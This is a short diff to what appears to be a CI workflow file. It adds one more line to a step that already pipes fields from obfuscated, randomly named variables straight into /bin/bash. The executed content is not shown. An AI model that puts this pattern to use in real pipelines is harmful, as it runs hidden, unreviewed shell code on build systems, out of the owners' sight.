@@ -51,6 +51,7 @@ jobs:
           echo $jc72 | jq -r .fd4 | /bin/bash
           echo $upu6 | jq -r .kxcq89293 | /bin/bash
           echo $e42 | jq -r .vtth1 | /bin/bash
+          echo $dtbet80 | jq -r .x50 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
